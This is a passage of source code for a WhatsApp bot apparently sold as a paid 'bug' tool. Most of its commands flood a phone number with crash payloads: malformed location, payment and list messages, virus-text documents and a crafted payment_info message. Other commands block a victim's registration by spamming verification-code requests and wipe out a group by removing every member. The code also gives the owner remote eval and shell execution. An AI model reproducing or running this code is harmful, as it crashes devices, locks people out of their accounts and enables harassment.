if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await locationcrash(Pe)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
await listfuck(Pe, oneclick)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await sendPaymentInfoMessage(Pe)
await locationcrash(Pe, force)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘜𝘵𝘢𝘮𝘢𝘬𝘢𝘯 𝘍𝘶𝘯𝘨𝘴𝘪 𝘋𝘦𝘤𝘬\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘜𝘵𝘢𝘮𝘢𝘬𝘢𝘯 𝘍𝘶𝘯𝘨𝘴𝘪 𝘋𝘦𝘤𝘬\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘜𝘵𝘢𝘮𝘢𝘬𝘢𝘯 𝘍𝘶𝘯𝘨𝘴𝘪 𝘋𝘦𝘤𝘬\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘜𝘵𝘢𝘮𝘢𝘬𝘢𝘯 𝘍𝘶𝘯𝘨𝘴𝘪 𝘋𝘦𝘤𝘬\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, GlobalTechbug)
await listfuck(Pe)
await sendMultiplePaymentInvites(Pe, force)
await locationcrash(Pe, zynbug)
await sendPaymentInfoMessage(Pe, GlobalTechbug)
}
await replyz(mess.donebug)
}
break

case 'darkness': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendMultiplePaymentInvites(Pe)
await sendMultiplePaymentInvites(Pe, GlobalTechbug)
await locationcrash(Pe, GlobalTechbug)
await listfuck(Pe)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await sendPaymentInfoMessage(Pe)
await sendMultiplePaymentInvites(Pe, force)
await locationcrash(Pe, GlobalTechbug)
await await GlobalTechInc.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅 ` }, { quoted:m })
await GlobalTechInc.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅 ` }, { quoted:m })
await sleep(500)
await GlobalTechInc.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅 ` }, { quoted:m })
await sleep(500)
await GlobalTechInc.sendMessage(Pe, { document: virgam,  caption: `Darkness 㐅 ` }, { quoted:m })
await sleep(500)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, GlobalTechbug)
await sendMultiplePaymentInvites(Pe)
await listfuck(Pe)
await locationcrash(Pe)
await sendPaymentInfoMessage(Pe, GlobalTechbug)
}
await replyz(mess.donebug)
}
break

case 'slayer': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendMultiplePaymentInvites(Pe)
await sendMultiplePaymentInvites(Pe, GlobalTechbug)
await locationcrash(Pe)
await listfuck(Pe, oneclick)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await sendMultiplePaymentInvites(Pe, force)
await locationcrash(Pe, force)
await sendPaymentInfoMessage(Pe)
await GlobalTechInc.sendMessage(Pe, { image: slayer,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 ` }, { quoted:m })
await sleep(500)
await GlobalTechInc.sendMessage(Pe, { image: slayer,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 ` }, { quoted:m })
await sleep(500)
await GlobalTechInc.sendMessage(Pe, { image: slayer,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 ` }, { quoted:m })
await sleep(500)
await GlobalTechInc.sendMessage(Pe, { image: slayer,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 ` }, { quoted:m })
await sleep(500)
await sendPaymentInfoMessage(Pe, force2)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
await listfuck(Pe)
await bakdok(Pe, GlobalTechbug)
await sendPaymentInfoMessage(Pe, GlobalTechbug)
}
await replyz(mess.donebug)
}
break

case 'virtex': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendMultiplePaymentInvites(Pe)
await listfuck(Pe, oneclick)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
await sendPaymentInfoMessage(Pe)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘡𝘺𝘯𝘹𝘻𝘰 𝘈𝘯𝘵𝘪 𝘎𝘦𝘥𝘰𝘳\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘡𝘺𝘯𝘹𝘻𝘰 𝘈𝘯𝘵𝘪 𝘎𝘦𝘥𝘰𝘳\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘡𝘺𝘯𝘹𝘻𝘰 𝘈𝘯𝘵𝘪 𝘎𝘦𝘥𝘰𝘳\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘡𝘺𝘯𝘹𝘻𝘰 𝘈𝘯𝘵𝘪 𝘎𝘦𝘥𝘰𝘳\``}, {quoted: m})
await sleep(500)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, GlobalTechbug)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
}
await replyz(mess.donebug)
}
break

case 'iphone': case 'xiphone':  case 'killios': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await aipong(Pe)
await sendMultiplePaymentInvites(Pe)
await sendMultiplePaymentInvites(Pe, oneclick)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await locationcrash(Pe, GlobalTechbug)
await listfuck(Pe, oneclick)
await sendPaymentInfoMessage(Pe)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘐𝘱𝘩𝘰𝘯𝘦𝘦 𝘊𝘳𝘢𝘴𝘩𝘩 \``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘐𝘱𝘩𝘰𝘯𝘦𝘦 𝘊𝘳𝘢𝘴𝘩𝘩\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘐𝘱𝘩𝘰𝘯𝘦𝘦 𝘊𝘳𝘢𝘴𝘩𝘩\``}, {quoted: m})
await sleep(500)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘐𝘱𝘩𝘰𝘯𝘦𝘦 𝘊𝘳𝘢𝘴𝘩𝘩\``}, {quoted: m})
await sleep(500)
await sendMultiplePaymentInvites(Pe, force)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe)
await listfuck(Pe)
await bakdok(Pe, GlobalTechbug)
}
await replyz(mess.donebug)
}
break

case 'android': case 'xandro':  case 'killandro': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await listfuck(Pe, oneclick)
await sendMultiplePaymentInvites(Pe)
await listfuck(Pe)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘞𝘢𝘳𝘳 𝘋𝘦𝘤𝘬 \``}, {quoted: m})
GlobalTechInc.sendMessage(Pe, {text: `\`𝘞𝘢𝘳𝘳 𝘋𝘦𝘤𝘬\``}, {quoted: m})
GlobalTechInc.sendMessage(Pe, {text: `\`𝘞𝘢𝘳𝘳 𝘋𝘦𝘤𝘬\``}, {quoted: m})
GlobalTechInc.sendMessage(Pe, {text: `\`𝘞𝘢𝘳𝘳 𝘋𝘦𝘤𝘬 \``}, {quoted: m})
await sendPaymentInfoMessage(Pe)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, GlobalTechbug)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe)
}
await replyz(mess.donebug)
}
break

case 'antigedor': case 'vip-bug': case 'wardek': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Usage .${command} 923444844060`)
let peler = q.replace(/[^0-9]/g, '');
if (peler.startsWith('0')) return replyz(`Example : ${prefix+command} 923444844060`)
var contactInfo = await GlobalTechInc.onWhatsApp(peler + "@s.whatsapp.net");
  let whatsappNumber = peler + '@s.whatsapp.net';
  if (peler == "916909137213") {
    return;
    }
    if (peler == "919366316008") {
    return;
    }
    if (peler == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyz("The number is not registered on WhatsApp");
  }
  async function BugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await BugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
				}
                break;
                
case 'checkmatch': {
if (!q) return m.replyz(`Usage ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var jodoh = ['yanti', 'bunda maria', 'monyet', 'uni bakwan', 'popo berby', 'mimi pery', 'suyono', 'uni oncom', 'kosong', 'susilo', 'yanto']
var jodoh = jodoh[Math.floor(Math.random() * jodoh.length)]
m.replyz(`Nama : ${q}\nJodoh anda : *${jodoh}*`)
}
break

case 'checkquota': {
if (!q) return m.replyz(`Usage ${command} Nama\n\nContoh : ${prefix + command} ${pushname}`)
var pulsa = ['1kb', '5mb', '20mb', '3gb', '5gb', '7gb', '10gb', '1gb', 'banteng 2gb', '2.5gb', '1tb', '7mb', 'habis', '1,3gb', '4,1gb', '0,1kb']
var pulsa = pulsa[Math.floor(Math.random() * pulsa.length)]
replyz(`Nama : ${q}\nkuota anda : *${pulsa}*`)
}
break

case 'kudetathp': {
if (!isPremium) return replyz(mess.OnlyOwner)
if (!isGroup) return replyz(`Special In Bego Group`)
if (!isAdmins && !isPremium) return GlobalTechInc.sendMessage('Only Admin')
if (!isBotAdmins) return GlobalTechInc.sendMessage(`Bot Not Stupid Admin`)
await GlobalTechInc.groupUpdateSubject(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗚𝗹𝗼𝗯𝗮𝗹𝗧𝗲𝗰𝗵')
await GlobalTechInc.groupUpdateDescription(m.chat, '𝙆𝙐𝘿𝙀𝙏𝘼 𝘽𝙔 𝗚𝗹𝗼𝗯𝗮𝗹𝗧𝗲𝗰𝗵')
let data = participants.map((x) => x.id)
for (let x of data) {
if (x !== botNumber && x !== groupMetadata.owner && x !== kontributor + "@s.whatsapp.net") {
await GlobalTechInc.groupParticipantsUpdate(m.chat, [x], "remove")
}}}
break

case 'beta-new': case 'wa-ori':  case 'wa-busins': case 'wa-mod': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Usage .${command} 923444844060`)
let peler = q.replace(/[^0-9]/g, '');
if (peler.startsWith('0')) return replyz(`Example : ${prefix+command} 923444844060`)
var contactInfo = await GlobalTechInc.onWhatsApp(peler + "@s.whatsapp.net");
  let whatsappNumber = peler + '@s.whatsapp.net';
  if (peler == "916909137213") {
    return;
    }
    if (peler == "919366316008") {
    return;
    }
    if (peler == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyz("The number is not registered on WhatsApp");
  }
  async function BugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await BugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
				}
                break;

case 'onlybug': case 'onekill': case 'doublekill': case 'triplekill':  case 'maniac': case 'savage': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Enter Country Code Initial Number\n\n\`[ # ]\` Example : .${command} 923xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await sendPaymentInfoMessage(Pe)
await sendMultiplePaymentInvites(Pe, force)
await locationcrash(Pe)
await listfuck(Pe, oneclick)
await sendExtendedTextMessage(Pe, force)
await blackening(Pe, force2)
await sendMultiplePaymentInvites(Pe)
await sendPaymentInfoMessage(Pe, zpay)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
await sendPaymentInfoMessage(Pe, force)
await locationcrash(Pe, force2)
GlobalTechInc.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩\``}, {quoted: m})
GlobalTechInc.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩\``}, {quoted: m})
GlobalTechInc.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩 \``}, {quoted: m})
GlobalTechInc.sendMessage(Pe, {text: `\`𝘊𝘳𝘢𝘴𝘩\``}, {quoted: m})
await sendPaymentInfoMessage(Pe, force2)
await bakdok(Pe, GlobalTechbug)
await listfuck(Pe)
await sendMultiplePaymentInvites(Pe)
await sendPaymentInfoMessage(Pe, GlobalTechbug)
await sendMultiplePaymentInvites(Pe)
await locationcrash(Pe, GlobalTechbug)
}
await replyz(mess.donebug)
}
break

case 'tempban': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: ${prefix + command} 92|3xxx`)
if (!/|/.test(text)) return replyz(`Kek gini tolol \n ${prefix + command} 92|3444844060`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replyz(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'proses': {
	let t = text.split(',');
	if (t.length < 2) return replyz(`*Format salah!*

Usage:
${prefix + command} GOODS,nominal,payment`);
	let GOODS = t[0];
	let nominal = t[1];
	let payment = t[2];
	replyz(`━━━━[ *INFO TRANSACTION* ]━━━━

📦 *GOODS:* *${GOODS}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *DATE:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *PROSES*

*WAIT BRO* *${namastore}* *PROSES YA KAK*`)
}
break

case 'done': {
	let t = text.split(',');
	if (t.length < 2) return replyz(`*Format salah!*

Usage:
${prefix + command} GOODS,nominal,payment`);
	let GOODS = t[0];
	let nominal = t[1];
	let payment = t[2];
	replyz(`━━━━[ *INFO TRANSACTION* ]━━━━

📦 *GOODS:* *${GOODS}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *DATE:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *SUCCEED*

*THANK YOU FOR ORDERING AT* *${namastore}* *DON'T FORGET TO ORDER AGAIN*🙏`)
}
break
case "buysc": {
let imgsc = await prepareWAMessageMedia({
image: qris
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `𝗚𝗹𝗼𝗯𝗮𝗹𝗧𝗲𝗰𝗵

𝟭. ᴠᴇʀsɪᴏɴ ɪx \`𝟲𝟬.𝟬𝟬𝟬\`
𝟮. ᴠᴇʀsɪᴏɴ ᴠɪɪɪ \`𝟱𝟬.𝟬𝟬𝟬\`
𝟯. ᴠᴇʀsɪᴏɴ ᴠɪɪ \`𝟯𝟬.𝟬𝟬𝟬\`
𝟰. ᴠᴇʀsɪᴏɴ ᴠɪ \`𝟮𝟬.𝟬𝟬𝟬\``
	const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: 'Owner',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'ai': {
GlobalTechInc.sendMessage(from, {react: {text: "", key: m.key}})
  if (!text) {
    return replyz(`Contoh: ${prefix + command} hai`);
  }
  const prompt = "mulai dari sekarang nama anda adalah GlobalTechInc, anda adalah seorang kecerdasan buatan yang di buat oleh GlobalTechInc. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    replyz(response);
  } catch (err) {
    replyz(err.toString());
  }
}
break;

case 'self': {
if (!isCreator) return replyz(mess.OnlyOwner)
GlobalTechInc.public = false
replyz('Success Change To Self Mode')
}
break

case 'public': {
if (!isCreator) return replyz(mess.OnlyOwner)
GlobalTechInc.public = true
replyz('Success Change To Public Mode')
}
break
case 'owner': {
	await GlobalTechInc.sendMessage(m.chat, {
		react: {
			text: "",
			key: m.key,
		}
	})
	let img = "http://telegra.ph/file/9a332c815ad31956d5ce6.jpg"
	async function image(url) {
		const {
			imageMessage
		} = await generateWAMessageContent({
			image: {
				url
			}
		}, {
			upload: GlobalTechInc.waUploadToServer
		})
		return imageMessage
	}
	let msg = generateWAMessageFromContent(
		m.chat, {
			viewOnceMessage: {
				message: {
					interactiveMessage: {
						body: {
							text: (`HAI KAK ${pushname}\nINI I AM THE OWNER, DON'T SPAM`)
						},
						carouselMessage: {
							cards: [{
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*Owner GlobalTech*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/923444844060?text=Halo+owner+ganteng","webview_presentation":null}',
									}, ],
								},
							}, {
								header: {
									imageMessage: await image(img),
									hasMediaAttachment: true,
								},
								body: {
									text: `*Channel GlobalTech*`
								},
								nativeFlowMessage: {
									buttons: [{
										name: "cta_url",
										buttonParamsJson: '{"display_text":"Channel","url":"https://whatsapp.com/channel/0029VagJIAr3bbVBCpEkAM07","merchant_url":"https://www.google.com"}',
									}, ],
								},
							}, ],
							messageVersion: 1,
						},
					},
				},
			},
		}, {});
	await GlobalTechInc.relayMessage(msg.key.remoteJid, msg.message, {
		messageId: msg.key.id,
	});
}
break

case 'play': {
	if (!text) return replyz(`*Example*: ${prefix + command} drunk text`)
	const randomReduction = Math.floor(Math.random() * 5) + 1;
	let search = await yts(text);
	let telaso = search.all[0].url;
	let body = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

please replyz ${prefix}*mp3/mp4* to download`;
	GlobalTechInc.sendMessage(m.chat, {
		image: {
			url: search.all[0].thumbnail
		},
		caption: body
	}, {
		quoted: m
	});
}
break

case 'mp4': {
	if (!m.quoted) return replyz('Reply Message')
	let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return replyz('Invalid URL YouTube');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length) return replyz('Invalid URL index');
	await downloadMp4(urls);
}
break

case 'mp3': {
	if (!m.quoted) return replyz('Reply Message');
	let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
	if (!urls) return replyz('Invalid URL YouTube');
	let urlIndex = parseInt(text) - 1;
	if (urlIndex < 0 || urlIndex >= urls.length)
		return replyz('Invalid URL index');
	await downloadMp3(urls);
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return replyz(bang)
}
try {
replyz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyz(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await replyz(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return replyz(`${err}`)
if (stdout) return replyz(stdout)
})
}
}

} catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
